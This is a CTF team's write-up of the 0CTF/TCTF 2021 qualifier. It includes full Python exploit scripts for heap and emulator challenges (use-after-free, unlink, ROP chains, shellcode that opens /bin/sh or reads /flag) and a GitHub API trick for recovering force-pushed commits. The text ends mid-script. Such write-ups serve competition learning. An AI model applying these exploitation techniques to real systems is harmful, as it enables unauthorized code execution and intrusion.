# 0CTF/TCTF 2021 Quals

**It's recommended to read our responsive [web version](https://balsn.tw/ctf_writeup/20210703-0ctf_tctf2021quals/) of this writeup.**


 - [0CTF/TCTF 2021 Quals](#0ctftctf-2021-quals)
   - [Misc](#misc)
     - [GutHib](#guthib)
       - [Failed Attempts](#failed-attempts)
     - [uc_baaaby](#uc_baaaby)
     - [Singer](#singer)
     - [gas machine](#gas-machine)
   - [Web](#web)
     - [1linephp](#1linephp)
   - [Pwn](#pwn)
     - [Listbook](#listbook)
     - [uc_masteeer](#uc_masteeer)
     - [uc_goood](#uc_goood)
     - [Babyheap2021](#babyheap2021)
     - [Hash Collision](#hash-collision)
   - [Crypto](#crypto)
     - [Checkin](#checkin)
   - [reverse](#reverse)
     - [vp](#vp)


## Misc

### GutHib

The challenge is to restore secret information on GitHub. The author uses `git push --force` to overwrite the commit. Also, the repository belongs to an organization without any public members, and the commit author is nobody (the email is a bogus address).

The idea here is to use Github API to retrieve events of the users. I come upon a [Stackoverflow post](https://stackoverflow.com/a/43271529/11712282) and fetch the events of the repo:

https://api.github.com/repos/awesome-ctf/TCTF2021-Guthib/events

One of the commit is overwritten. Lets just restore it:

https://api.github.com/repos/awesome-ctf/TCTF2021-Guthib/commits/6442a84e359a19c4aeb1ef792a04bb9206140926

Gottcha `flag{ZJaNicLjnDytwqosX8ebwiMdLGcMBL}`!

It's worth to mention that the events also leak the author of the commits, though it's unrelated to this challenge. 

#### Failed Attempts

- Forked repos: If the repo is forked first, we can probably still read the previous commits. However it seems that no one forked the repo before the CTF starts.

### uc_baaaby
- https://www.nayuki.io/page/fast-md5-hash-implementation-in-x86-assembly
- https://web.archive.org/web/20131109063453/https://www.onlinedisassembler.com/blog/?p=23

```python=
#!/usr/bin/env python3
from pwn import *

# flag{Hope_you_found_the_problem}

context.arch = 'amd64'

def ROUND0(a, b, c, d, k, s, t):
    r = f'''
        mov esi, {c}
        add {a}, [rbp+{k*4}]
        xor esi, {d}
        and esi, {b}
        xor esi, {d}
        lea {a}, [{a}+esi+{t}]
        rol {a}, {s}
        add {a}, {b}
    '''.strip()
    return r

def ROUND1(a, b, c, d, k, s, t):
    r = f'''
        mov esi, {d}
        mov edi, {d}
        add {a}, [rbp+{k*4}]
        not esi
        and edi, {b}
        and esi, {c}
        or  esi, edi
        lea {a}, [{a}+esi+{t}]
        rol {a}, {s}
        add {a}, {b}
    '''.strip()
    return r

def ROUND2(a, b, c, d, k, s, t):
    r = f'''
        mov esi, {c}
        add {a}, [rbp+{k*4}]
        xor esi, {d}
        xor esi, {b}
        lea {a}, [{a}+esi+{t}]
        rol {a}, {s}
        add {a}, {b}
    '''.strip()
    return r

def ROUND3(a, b, c, d, k, s, t):
    r = f'''
        mov esi, {d}
        not esi
        add {a}, [rbp+{k*4}]
        or  esi, {b}
        xor esi, {c}
        lea {a}, [{a}+esi+{t}]
        rol {a}, {s}
        add {a}, {b}
    '''.strip()
    return r


_asm = f'''
mov rbp, 0xbabecafe000
mov byte ptr [rbp+50], 0x80
mov qword ptr [rbp+56], 400
mov eax, 0x67452301
mov ebx, 0xEFCDAB89
mov ecx, 0x98BADCFE
mov edx, 0x10325476
{ROUND0('eax', 'ebx', 'ecx', 'edx',  0,  7,  0xD76AA478)}
{ROUND0('edx', 'eax', 'ebx', 'ecx',  1, 12,  0xE8C7B756)}
{ROUND0('ecx', 'edx', 'eax', 'ebx',  2, 17,  0x242070DB)}
{ROUND0('ebx', 'ecx', 'edx', 'eax',  3, 22, -0x3E423112)}
{ROUND0('eax', 'ebx', 'ecx', 'edx',  4,  7, -0x0A83F051)}
{ROUND0('edx', 'eax', 'ebx', 'ecx',  5, 12,  0x4787C62A)}
{ROUND0('ecx', 'edx', 'eax', 'ebx',  6, 17, -0x57CFB9ED)}
{ROUND0('ebx', 'ecx', 'edx', 'eax',  7, 22, -0x02B96AFF)}
{ROUND0('eax', 'ebx', 'ecx', 'edx',  8,  7,  0x698098D8)}
{ROUND0('edx', 'eax', 'ebx', 'ecx',  9, 12, -0x74BB0851)}
{ROUND0('ecx', 'edx', 'eax', 'ebx', 10, 17, -0x0000A44F)}
{ROUND0('ebx', 'ecx', 'edx', 'eax', 11, 22, -0x76A32842)}
{ROUND0('eax', 'ebx', 'ecx', 'edx', 12,  7,  0x6B901122)}
{ROUND0('edx', 'eax', 'ebx', 'ecx', 13, 12, -0x02678E6D)}
{ROUND0('ecx', 'edx', 'eax', 'ebx', 14, 17, -0x5986BC72)}
{ROUND0('ebx', 'ecx', 'edx', 'eax', 15, 22,  0x49B40821)}
{ROUND1('eax', 'ebx', 'ecx', 'edx',  1,  5, -0x09E1DA9E)}
{ROUND1('edx', 'eax', 'ebx', 'ecx',  6,  9, -0x3FBF4CC0)}
{ROUND1('ecx', 'edx', 'eax', 'ebx', 11, 14,  0x265E5A51)}
{ROUND1('ebx', 'ecx', 'edx', 'eax',  0, 20, -0x16493856)}
{ROUND1('eax', 'ebx', 'ecx', 'edx',  5,  5, -0x29D0EFA3)}
{ROUND1('edx', 'eax', 'ebx', 'ecx', 10,  9,  0x02441453)}
{ROUND1('ecx', 'edx', 'eax', 'ebx', 15, 14, -0x275E197F)}
{ROUND1('ebx', 'ecx', 'edx', 'eax',  4, 20, -0x182C0438)}
{ROUND1('eax', 'ebx', 'ecx', 'edx',  9,  5,  0x21E1CDE6)}
{ROUND1('edx', 'eax', 'ebx', 'ecx', 14,  9, -0x3CC8F82A)}
{ROUND1('ecx', 'edx', 'eax', 'ebx',  3, 14, -0x0B2AF279)}
{ROUND1('ebx', 'ecx', 'edx', 'eax',  8, 20,  0x455A14ED)}
{ROUND1('eax', 'ebx', 'ecx', 'edx', 13,  5, -0x561C16FB)}
{ROUND1('edx', 'eax', 'ebx', 'ecx',  2,  9, -0x03105C08)}
{ROUND1('ecx', 'edx', 'eax', 'ebx',  7, 14,  0x676F02D9)}
{ROUND1('ebx', 'ecx', 'edx', 'eax', 12, 20, -0x72D5B376)}
{ROUND2('eax', 'ebx', 'ecx', 'edx',  5,  4, -0x0005C6BE)}
{ROUND2('edx', 'eax', 'ebx', 'ecx',  8, 11, -0x788E097F)}
{ROUND2('ecx', 'edx', 'eax', 'ebx', 11, 16,  0x6D9D6122)}
{ROUND2('ebx', 'ecx', 'edx', 'eax', 14, 23, -0x021AC7F4)}
{ROUND2('eax', 'ebx', 'ecx', 'edx',  1,  4, -0x5B4115BC)}
{ROUND2('edx', 'eax', 'ebx', 'ecx',  4, 11,  0x4BDECFA9)}
{ROUND2('ecx', 'edx', 'eax', 'ebx',  7, 16, -0x0944B4A0)}
{ROUND2('ebx', 'ecx', 'edx', 'eax', 10, 23, -0x41404390)}
{ROUND2('eax', 'ebx', 'ecx', 'edx', 13,  4,  0x289B7EC6)}
{ROUND2('edx', 'eax', 'ebx', 'ecx',  0, 11, -0x155ED806)}
{ROUND2('ecx', 'edx', 'eax', 'ebx',  3, 16, -0x2B10CF7B)}
{ROUND2('ebx', 'ecx', 'edx', 'eax',  6, 23,  0x04881D05)}
{ROUND2('eax', 'ebx', 'ecx', 'edx',  9,  4, -0x262B2FC7)}
{ROUND2('edx', 'eax', 'ebx', 'ecx', 12, 11, -0x1924661B)}
{ROUND2('ecx', 'edx', 'eax', 'ebx', 15, 16,  0x1FA27CF8)}
{ROUND2('ebx', 'ecx', 'edx', 'eax',  2, 23, -0x3B53A99B)}
{ROUND3('eax', 'ebx', 'ecx', 'edx',  0,  6, -0x0BD6DDBC)}
{ROUND3('edx', 'eax', 'ebx', 'ecx',  7, 10,  0x432AFF97)}
{ROUND3('ecx', 'edx', 'eax', 'ebx', 14, 15, -0x546BDC59)}
{ROUND3('ebx', 'ecx', 'edx', 'eax',  5, 21, -0x036C5FC7)}
{ROUND3('eax', 'ebx', 'ecx', 'edx', 12,  6,  0x655B59C3)}
{ROUND3('edx', 'eax', 'ebx', 'ecx',  3, 10, -0x70F3336E)}
{ROUND3('ecx', 'edx', 'eax', 'ebx', 10, 15, -0x00100B83)}
{ROUND3('ebx', 'ecx', 'edx', 'eax',  1, 21, -0x7A7BA22F)}
{ROUND3('eax', 'ebx', 'ecx', 'edx',  8,  6,  0x6FA87E4F)}
{ROUND3('edx', 'eax', 'ebx', 'ecx', 15, 10, -0x01D31920)}
{ROUND3('ecx', 'edx', 'eax', 'ebx',  6, 15, -0x5CFEBCEC)}
{ROUND3('ebx', 'ecx', 'edx', 'eax', 13, 21,  0x4E0811A1)}
{ROUND3('eax', 'ebx', 'ecx', 'edx',  4,  6, -0x08AC817E)}
{ROUND3('edx', 'eax', 'ebx', 'ecx', 11, 10, -0x42C50DCB)}
{ROUND3('ecx', 'edx', 'eax', 'ebx',  2, 15,  0x2AD7D2BB)}
{ROUND3('ebx', 'ecx', 'edx', 'eax',  9, 21, -0x14792C6F)}
add eax, 0x67452301
add ebx, 0xEFCDAB89
add ecx, 0x98BADCFE
add edx, 0x10325476
mov [rbp+0x800], eax
mov [rbp+0x804], ebx
mov [rbp+0x808], ecx
mov [rbp+0x80c], edx
'''.strip()

print(_asm)
print()

sc = asm(_asm)
sc = b'\x66' * (0x2000 - len(sc)) + sc
ins_cnt = len(_asm.split('\n'))

y = remote('111.186.59.29', 10086)
y.send(sc)
y.interactive()
```

### Singer

guess the target and draw out notes to make letters
recovered data : MUSIKING

### gas machine

* Payload:

```
// a loop to consume most of the gas
// every loop costs 22 gas
JUMPDEST
GAS         
PUSH1 58    
LT          
PUSH1 0     
JUMPI

// jump according to the left gas amount
// 0 gas at STOP since
// gas - 16 + (50 - (gas - 2)) == the offset of STOP == 36
GAS      
PUSH1 50    
SUB         
JUMP                   
JUMPDEST
JUMPDEST
JUMPDEST
JUMPDEST
JUMPDEST
JUMPDEST
JUMPDEST
JUMPDEST
JUMPDEST
JUMPDEST
JUMPDEST
JUMPDEST
JUMPDEST
JUMPDEST
JUMPDEST
JUMPDEST
JUMPDEST
JUMPDEST
JUMPDEST
JUMPDEST
JUMPDEST
JUMPDEST
JUMPDEST
STOP
```

## Web

### 1linephp

This challenge is similar to [One Line PHP Challenge](https://github.com/orangetw/My-CTF-Web-Challenges#one-line-php-challenge) created by 🍊 in HITCON 2018, but it will append a `.php` extention to our filename.

```php=
<?php
($_=@$_GET['yxxx'].'.php') && @substr(file($_)[0],0,6) === '@<?php' ? include($_) : highlight_file(__FILE__) && include('phpinfo.html');
```

Use [Tool](https://github.com/brettalton/phpinfo-compare) to the compare with `phpinfo` generated by `php:7.4.11-apache`, we can find an extra php stream `zip://` in challenge's `phpinfo`.


## Pwn

### Listbook


abs(CHAR_MIN) = CHAR_MIN to overwrite in_use table for UAF + elementary glibc heap exploit

```python=
from pwn import *

###Util
def create(name,data):
    sname = name
    if type(sname)==str:
        sname = sname.encode()
    if len(sname)!=0x10:
        sname+=b'\n'
    if type(data)==str:
        data = data.encode()
    if len(data)!=0x200:
        data+=b'\n'
    r.sendlineafter('>>','1')
    r.sendafter('name>',sname)
    r.sendafter('content>',data)

def delete(idx):
    r.sendlineafter('>>','2')
    r.sendlineafter('index>',str(idx))
    return r.recvline()

def show(idx):
    r.sendlineafter('>>','3')
    r.sendlineafter('index>',str(idx))
    res = r.recvuntil(b'\n1.add',drop=True)
    res = b'\n'+res
    res = res.split(b'\n => ')[1:]
    print(res)
    return res

###Addr
#  libc2.31
main_arena_offset = 0x1ebb80
small_bin_offset = main_arena_offset+0x260
free_hook_offset = 0x1eeb28
system_offset = 0x55410

###Exploit
r = remote('111.186.58.249',20001)

create(b'\x00'*0xf+p8(0),'M30W') #0
create(b'\x00'*0xf+p8(1),'M30W') #1
create(b'\x00'*0xf+p8(2),'M30W') #2 #for book chunk consumption
for i in range(3,9):
    create(b'\x00'*0xf+p8(i),'M30W') #2~7
for i in range(3,8):
    delete(i)
delete(0)   #tcache first
delete(8)   #for OOB consumption
delete(2)   #for OOB consumption
delete(1)   #unsorted

create(b'\x00'*0xf+p8(0x80),'M30W') #OOB

heap_addr = u64(show(0)[0]+b'\x00\x00')-0x1290
small_bin_addr = u64(show(1)[0]+b'\x00\x00')
libc_base = small_bin_addr-small_bin_offset
print(hex(heap_addr))
print(hex(libc_base))

#for i in range(6):
for i in range(4):
    create(b'\x00'*0xf+p8(0xf),'M30W')  #exhaust
fake_footer = b'\x00'*0x20+p64(0)+p64(0x21)
create(b'\x00'*0xf+p8(0xf),fake_footer)  #exhaust    #to-hijack
fake_smallbin = b'\x00'*0x50+\
                p64(0)+p64(0x211)+\
                p64(heap_addr+0x500)+p64(heap_addr+0xa00)+\
                p64(0)+p64(0x211)+\
                p64(heap_addr+0x9e0)+p64(heap_addr+0xa20)+\
                p64(0)+p64(0x211)+\
                p64(heap_addr+0xa00)+p64(heap_addr+0xa40)+\
                p64(0)+p64(0x211)+\
                p64(heap_addr+0xa20)+p64(heap_addr+0xa60)+\
                p64(0)+p64(0x211)+\
                p64(heap_addr+0xa40)+p64(heap_addr+0xa80)+\
                p64(0)+p64(0x211)+\
                p64(heap_addr+0xa60)+p64(heap_addr+0xaa0)+\
                p64(0)+p64(0x211)+\
                p64(heap_addr+0xa80)+p64(heap_addr+0xac0)+\
                p64(0)+p64(0x211)+\
                p64(heap_addr+0xaa0)+p64(libc_base+small_bin_offset)
create(b'\x00'*0xf+p8(0xf),fake_smallbin)  #exhaust    #hijacker

create(b'\x00'*0xf+p8(0xe),'M30W')
create(b'\x00'*0xf+p8(0xf),'M30W')  #placeholder

delete(15)
delete(14)  #smallbin->510
create(b'\x00'*0xf+p8(0xf),'M30W')  #clean up entry
delete(1)   #tcache->510
fake_smallbin = p64(libc_base+small_bin_offset)+p64(heap_addr+0x9e0)    #990
create(b'\x00'*0xf+p8(0xe),fake_smallbin)

for i in range(6):
    create(b'\x00'*0xf+p8(0xf),'M30W')

create(b'\x00'*0xf+p8(0xf),b'\x00'*0xd0+p64(0)+p64(0x211)+p64(libc_base+free_hook_offset-8)+p64(0))  #hijack
create(b'\x00'*0xf+p8(0xf),'M30W')
create(b'\x00'*0xf+p8(0xd),b'/bin/sh\x00'+p64(libc_base+system_offset))
delete(13)

r.interactive()
```

### uc_masteeer

modify function table on stack to redirect admin code flow and gain arbitrary code execution under admin privs

```python=
from pwn import *

context.arch = 'amd64'

###Util
def run_admin():
    r.sendlineafter('?: \x00','1')

def run_user():
    r.sendlineafter('?: \x00','2')

def patch(addr,data):
    r.sendlineafter('?: \x00','3')
    r.sendafter('addr: \x00',p64(addr))
    r.sendafter('size: \x00',p64(len(data)))
    r.sendafter('data: \x00',data)

###Exploit
r = remote('111.186.59.29',10087)

stack_addr = 0xbabecafe000
trigger_addr = 0xbabecafe233
code_addr = 0xdeadbeef000
customcode_addr = code_addr+0x1000

r.send('M30W')
patch(stack_addr,p64(code_addr))
cmd = b'k33nlab/readflag\x00'
patch(stack_addr+0x20,cmd)
run_admin()

sc = asm(f'''
          mov rdi, {stack_addr+0x20}
          mov rax, {trigger_addr}
          mov qword ptr [rax], rdi
          ''')
patch(customcode_addr,sc)
patch(stack_addr,p64(customcode_addr))
run_user()

r.interactive()
```

### uc_goood

utilize unicorn code hook boundary check miscalculation and enter from misaligned admin code entry point

the misaligned code is some rax deref + write, find approprite target to overwrite and change admin code so that we get an arbitrary address/content write before reaching original hook_mem_access

then utilize the arbitrary write to trigger hook_mem_access with arbitrary payload

```python=
from pwn import *

context.arch = 'amd64'

###Util
def run_admin():
    r.sendlineafter('?: \x00','1')

def run_user():
    r.sendlineafter('?: \x00','2')

def patch(addr,data):
    r.sendlineafter('?: \x00','3')
    r.sendafter('addr: \x00',p64(addr))
    r.sendafter('size: \x00',p64(len(data)))
    r.sendafter('data: \x00',data)

###Exploit
r = remote('111.186.59.29',10087)

stack_addr = 0xbabecafe000
trigger_addr = 0xbabecafe233
code_addr = 0xdeadbeef000
customcode_addr = code_addr+0x1000

r.send('M30W')
patch(stack_addr,p64(code_addr))
cmd = b'k33nlab/readflag\x00'
patch(stack_addr+0x20,cmd)
run_admin()

sc = asm(f'''
          mov rdi, {stack_addr+0x20}
          mov rax, {trigger_addr}
          mov qword ptr [rax], rdi
          ''')
patch(customcode_addr,sc)
patch(stack_addr,p64(customcode_addr))
run_user()

r.interactive()
```

### Babyheap2021

musl libc with heap OOB
unlink attack -> arbitrary malloc -> hijack stdout -> longjmp -> ROP -> shellcode

```python=
from pwn import *

context.arch = 'amd64'

###Util
def create(size,data):
    if type(data)==str:
        data = data.encode()
    if len(data)<size-1:
        data+=b'\n'
    r.sendlineafter('Command: ','1')
    r.sendlineafter('Size: ',str(size))
    r.sendafter('Content: ',data)

def edit(idx,size,data):
    if type(data)==str:
        data = data.encode()
    if len(data)<size-1:
        data+=b'\n'
    r.sendlineafter('Command: ','2')
    r.sendlineafter('Index: ',str(idx))
    r.sendlineafter('Size: ',str(size))
    r.sendafter('Content: ',data)

def delete(idx):
    r.sendlineafter('Command: ','3')
    r.sendlineafter('Index: ',str(idx))

def show(idx):
    r.sendlineafter('Command: ','4')
    r.sendlineafter('Index: ',str(idx))
    r.recvuntil(': ')
    return r.recvuntil('\n1. Allocate',drop=True)

###Addr
#  musl libc
stdout_struct_offset = 0xb0280
bin_offset = 0xb0a48
bin3_offset = bin_offset+0x18*3

###ROPgadget
L_nop = 0x15292
L_pop_rdi = 0x15291
L_pop_rsi = 0x1d829
L_pop_rdx = 0x2cdda
L_pop_rax = 0x16a16
L_inc_eax = 0x1e3cf
L_syscall = 0x23720
L_longjmp = 0x78d24

###Exploit
r = remote('111.186.59.11',11124)

create(0x10,'M30W') #0
create(0x10,'M30W') #1
create(0x10,'M30W') #2
create(0x10,'M30W') #3
create(0x10,'M30W') #4
create(0x10,'M30W') #5
create(0x70,'M30W') #6
create(0xf0,'M30W') #7

#leak
create(0x30,'M30W') #8
create(0x50,'M30W') #9
create(0x30,'M30W') #10
edit(8,0xffffffff,b'\x00'*0x30+p64(0x41)+p64(0x81)+b'\x00'*0x50+p64(0x61)+p64(0x41)+b'\x00'*0x10+p64(0x81)+p64(0x21)+b'\x00'*0x10+p64(0x61)+p64(0xc00)[:-1])
delete(9)
create(0x70,'M30W') #9
edit(8,0xffffffff,b'\x00'*0x30+p64(0x41)+p64(0x61)+b'\x00'*0x50+p64(0x61)+p64(0x21)+b'\x00'*0x10+p64(0x21)+p64(0x21)+b'\x00'*0x10+p64(0x41)+p64(0xc00)[:-1])
delete(10)
leaks = show(9)
libc_base = u64(leaks[0x60:0x68])-0xb0a40
print(hex(libc_base))
create(0x10,'M30W') #10

delete(6)
delete(2)
edit(0,0xffffffff,b'\x00'*0x10+p64(0x21)+p64(0x21)+b'\x00'*0x10+p64(0x21)+p64(0x20)+p64(libc_base+stdout_struct_offset-0x70)+p64(libc_base+stdout_struct_offset-0x70)+p64(0x20)[:-1])
create(0x10,'M30W') #2
delete(4)
edit(2,0x10,p64(libc_base+bin3_offset-0x10)+p64(libc_base+stdout_struct_offset-0x70)[:-1])
create(0x10,'M30W') #4
create(0x70,'M30W') #6  #before stdout

padding = b'\x00'*0x60
fake_file = p64(0)*4+p64(1)+p64(1)+p64(libc_base+stdout_struct_offset+0x50)+p64(libc_base+L_nop)+p64(0)+p64(libc_base+L_longjmp)
ROPchain = p64(libc_base+L_pop_rdi)+p64((libc_base+stdout_struct_offset)&0xfffffffffffff000)+\
           p64(libc_base+L_pop_rsi)+p64(0x1000)+\
           p64(libc_base+L_pop_rdx)+p64(7)+\
           p64(libc_base+L_pop_rax)+p64(9)+\
           p64(libc_base+L_inc_eax)+\
           p64(libc_base+L_syscall)+\
           p64(libc_base+stdout_struct_offset+0x50+0x58)
sc = asm(f'''
          mov rdi, {libc_base+stdout_struct_offset+0x50+0x58+0x70}
          mov rsi, 0
          mov rdx, 0
          mov rax, 2
          syscall

          mov rdi, rax
          mov rsi, {libc_base+stdout_struct_offset+0x50+0x58+0x70}
          mov rdx, 0x100
          mov rax, 0
          syscall

          mov rdi, 1
          mov rsi, {libc_base+stdout_struct_offset+0x50+0x58+0x70}
          mov rdx, 0x100
          mov rax, 1
          syscall
          ''')
args = b'/flag\x00'
payload = padding+fake_file+ROPchain+sc.ljust(0x70,b'\x00')+args
edit(6,0xffffffff,payload)

r.interactive()
#reference https://itw01.com/8I2X8E9.html
```

### Hash Collision

Challenge can be divided into 2 parts
1. hash collision
2. pwning the index OOB bug


Part 1 : 




```python=
import random

R = [0xd202ef8d,0xa505df1b,0x3c0c8ea1,0x4b0bbe37
	,0xd56f2b94,0xa2681b02,0x3b614ab8,0x4c667a2e
	,0xdcd967bf,0xabde5729,0x32d70693,0x45d03605
	,0xdbb4a3a6,0xacb39330,0x35bac28a,0x42bdf21c
	,0xcfb5ffe9,0xb8b2cf7f,0x21bb9ec5,0x56bcae53
	,0xc8d83bf0,0xbfdf0b66,0x26d65adc,0x51d16a4a
	,0xc16e77db,0xb669474d,0x2f6016f7,0x58672661
	,0xc603b3c2,0xb1048354,0x280dd2ee,0x5f0ae278
	,0xe96ccf45,0x9e6bffd3,0x0762ae69,0x70659eff
	,0xee010b5c,0x99063bca,0x000f6a70,0x77085ae6
	,0xe7b74777,0x90b077e1,0x09b9265b,0x7ebe16cd
	,0xe0da836e,0x97ddb3f8,0x0ed4e242,0x79d3d2d4
	,0xf4dbdf21,0x83dcefb7,0x1ad5be0d,0x6dd28e9b
	,0xf3b61b38,0x84b12bae,0x1db87a14,0x6abf4a82
	,0xfa005713,0x8d076785,0x140e363f,0x630906a9
	,0xfd6d930a,0x8a6aa39c,0x1363f226,0x6464c2b0
	,0xa4deae1d,0xd3d99e8b,0x4ad0cf31,0x3dd7ffa7
	,0xa3b36a04,0xd4b45a92,0x4dbd0b28,0x3aba3bbe
	,0xaa05262f,0xdd0216b9,0x440b4703,0x330c7795
	,0xad68e236,0xda6fd2a0,0x4366831a,0x3461b38c
	,0xb969be79,0xce6e8eef,0x5767df55,0x2060efc3
	,0xbe047a60,0xc9034af6,0x500a1b4c,0x270d2bda
	,0xb7b2364b,0xc0b506dd,0x59bc5767,0x2ebb67f1
	,0xb0dff252,0xc7d8c2c4,0x5ed1937e,0x29d6a3e8
	,0x9fb08ed5,0xe8b7be43,0x71beeff9,0x06b9df6f
	,0x98dd4acc,0xefda7a5a,0x76d32be0,0x01d41b76
	,0x916b06e7,0xe66c3671,0x7f6567cb,0x0862575d
	,0x9606c2fe,0xe101f268,0x7808a3d2,0x0f0f9344
	,0x82079eb1,0xf500ae27,0x6c09ff9d,0x1b0ecf0b
	,0x856a5aa8,0xf26d6a3e,0x6b643b84,0x1c630b12
	,0x8cdc1683,0xfbdb2615,0x62d277af,0x15d54739
	,0x8bb1d29a,0xfcb6e20c,0x65bfb3b6,0x12b88320
	,0x3fba6cad,0x48bd5c3b,0xd1b40d81,0xa6b33d17
	,0x38d7a8b4,0x4fd09822,0xd6d9c998,0xa1def90e
	,0x3161e49f,0x4666d409,0xdf6f85b3,0xa868b525
	,0x360c2086,0x410b1010,0xd80241aa,0xaf05713c
	,0x220d7cc9,0x550a4c5f,0xcc031de5,0xbb042d73
	,0x2560b8d0,0x52678846,0xcb6ed9fc,0xbc69e96a
	,0x2cd6f4fb,0x5bd1c46d,0xc2d895d7,0xb5dfa541
	,0x2bbb30e2,0x5cbc0074,0xc5b551ce,0xb2b26158
	,0x04d44c65,0x73d37cf3,0xeada2d49,0x9ddd1ddf
	,0x03b9887c,0x74beb8ea,0xedb7e950,0x9ab0d9c6
	,0x0a0fc457,0x7d08f4c1,0xe401a57b,0x930695ed
	,0x0d62004e,0x7a6530d8,0xe36c6162,0x946b51f4
	,0x19635c01,0x6e646c97,0xf76d3d2d,0x806a0dbb
	,0x1e0e9818,0x6909a88e,0xf000f934,0x8707c9a2
	,0x17b8d433,0x60bfe4a5,0xf9b6b51f,0x8eb18589
	,0x10d5102a,0x67d220bc,0xfedb7106,0x89dc4190
	,0x49662d3d,0x3e611dab,0xa7684c11,0xd06f7c87
	,0x4e0be924,0x390cd9b2,0xa0058808,0xd702b89e
	,0x47bda50f,0x30ba9599,0xa9b3c423,0xdeb4f4b5
	,0x40d06116,0x37d75180,0xaede003a,0xd9d930ac
	,0x54d13d59,0x23d60dcf,0xbadf5c75,0xcdd86ce3
	,0x53bcf940,0x24bbc9d6,0xbdb2986c,0xcab5a8fa
	,0x5a0ab56b,0x2d0d85fd,0xb404d447,0xc303e4d1
	,0x5d677172,0x2a6041e4,0xb369105e,0xc46e20c8
	,0x72080df5,0x050f3d63,0x9c066cd9,0xeb015c4f
	,0x7565c9ec,0x0262f97a,0x9b6ba8c0,0xec6c9856
	,0x7cd385c7,0x0bd4b551,0x92dde4eb,0xe5dad47d
	,0x7bbe41de,0x0cb97148,0x95b020f2,0xe2b71064
	,0x6fbf1d91,0x18b82d07,0x81b17cbd,0xf6b64c2b
	,0x68d2d988,0x1fd5e91e,0x86dcb8a4,0xf1db8832
	,0x616495a3,0x1663a535,0x8f6af48f,0xf86dc419
	,0x660951ba,0x110e612c,0x88073096,0xff000000]

IR = [38, 103, 229, 164, 160, 225, 99, 34, 107, 42, 168, 233, 237, 172, 46, 111, 188, 253, 127, 62, 58, 123, 249, 184, 241, 176, 50, 115, 119, 54, 180, 245, 83, 18, 144, 209, 213, 148, 22, 87, 30, 95, 221, 156, 152, 217, 91, 26, 201, 136, 10, 75, 79, 14, 140, 205, 132, 197, 71, 6, 2, 67, 193, 128, 204, 141, 15, 78, 74, 11, 137, 200, 129, 192, 66, 3, 7, 70, 196, 133, 86, 23, 149, 212, 208, 145, 19, 82, 27, 90, 216, 153, 157, 220, 94, 31, 185, 248, 122, 59, 63, 126, 252, 189, 244, 181, 55, 118, 114, 51, 177, 240, 35, 98, 224, 161, 165, 228, 102, 39, 110, 47, 173, 236, 232, 169, 43, 106, 179, 242, 112, 49, 53, 116, 246, 183, 254, 191, 61, 124, 120, 57, 187, 250, 41, 104, 234, 171, 175, 238, 108, 45, 100, 37, 167, 230, 226, 163, 33, 96, 198, 135, 5, 68, 64, 1, 131, 194, 139, 202, 72, 9, 13, 76, 206, 143, 92, 29, 159, 222, 218, 155, 25, 88, 17, 80, 210, 147, 151, 214, 84, 21, 89, 24, 154, 219, 223, 158, 28, 93, 20, 85, 215, 150, 146, 211, 81, 16, 195, 130, 0, 65, 69, 4, 134, 199, 142, 207, 77, 12, 8, 73, 203, 138, 44, 109, 239, 174, 170, 235, 105, 40, 97, 32, 162, 227, 231, 166, 36, 101, 182, 247, 117, 52, 48, 113, 243, 178, 251, 186, 56, 121, 125, 60, 190, 255]

def forwardpass(data):
    v7 = 0
    v9 = 0
    for i in range(len(data)):
        v10 = data[i]
        v11 = (v7^v9^v10)&0xff
        v7 = v10&0xf0
        v9 = R[v11]^(v9>>8)
    return v7, v9


def mix(data):
    v7, v9 = forwardpass(data)
    v4 = v9>>8
    v5 = (v7^v9)&0xff
    v12 = R[v5]^v4
    v13 = R[v12>>24]
    v14 = R[(v13^(v12>>8))&0xff]^(v13>>8)
    v15 = R[(v14^v12)&0xff]^(v14>>8)
    return 0xffffffff^(R[(v15^(v12>>16))&0xff]^(v15>>8))

def recover(num,size,prefix=b''):
    if size<len(prefix):
        print('impossible')
        exit()
    num = 0xffffffff^num
    Hnum = R[IR[num>>24]]
    v15 = (num^Hnum)<<8
    Hv15 = R[IR[v15>>24]]
    v14 = (v15^Hv15)<<8
    Hv14 = R[IR[v14>>24]]
    v13 = (v14^Hv14)<<8
    v13 = R[IR[v13>>24]]
    v12 = IR[v13>>24]<<24
    v12|=(IR[v14>>24]^(v13&0xff))<<8
    v14 = R[(v13^(v12>>8))&0xff]^(v13>>8)
    v12|=(IR[v15>>24]^(v14&0xff))
    v15 = R[(v14^v12)&0xff]^(v14>>8)
    v12|=(IR[num>>24]^(v15&0xff))<<16
    v5 = IR[v12>>24]
    v4 = v12^R[v5]
    v9 = v5|(v4<<8) #provided that the last char must be 0
    state = v9
    indices = [0,0,0,0]
    for i in range(3,-1,-1): #
        indices[i] = IR[state>>24]
        state^=R[indices[i]]
        state=(state<<8)&0xffffffff

    while True:
        padding = random.randbytes(size-len(prefix)-4)
        padding = padding.replace(b'\n',b'\x00')
        prevc, target = forwardpass(prefix+padding)

        res = [0,0,0,0]
        prevc&=0xf0
        for i in range(4):
            res[i] = indices[i]^prevc^(target&0xff)
            prevc = res[i]&0xf0
            target = R[indices[i]]^(target>>8)
        res = bytes(res)
        if b'\n' not in res and res[-1]==0:
            return prefix+padding+res
        elif len(padding)==0:
            print('impossible')
            exit()
'''
res = recover(0xdeadbeef,0x20,b'hello')
print(res)
res = recover(0xbabecafe,0x31,b'asdhuiqwuen')
print(res)
'''

'''
               X  X  X  X
            U1 U1 U1 U1
         U2 U2 U2 U2
      U3 U3 U3 U3
   U4 U4 U4 U4
N  N  N  N      v7^v9 = v11

R  R  R  R


      v11 = v7 ^ (unsigned __int8)(v9 ^ 0);
      v11 -> fixed val

'''
```


```python=
from pwn import *
from mixer import *
from IO_FILE import *
from ctypes import *
import time

context.arch = 'amd64'
libc = CDLL("libc.so.6")

def batchgen():
    global seenaddr
    addr = libc.rand()&0xfffffffffffff000
    if addr in seenaddr or addr+0x1000 in seenaddr:
        collision = True
    else:
        collision = False
    seenaddr.add(addr)
    seenaddr.add(addr+0x1000)
    randnums = [0 for i in range(0x400)]
    for i in range(0x400):
        randnums[i] = libc.rand()
    return collision, randnums

def guess(idx,target_hash,size,data=b''):
    global buffill
    if type(data)==str:
        data = data.encode()
    if target_hash!=-1:
        if size<len(data)+4:
            print('impossible')
            exit()
        data=recover(target_hash,size,data)
        buffill+=13
    else:
        data = data.ljust(size,b'\x00')
    if size<0x10:
        print('nope')
        exit()
    r.send(str(idx).rjust(7,' '))
    r.send(str(size).rjust(7,' '))
    r.send(data[:-1])
 

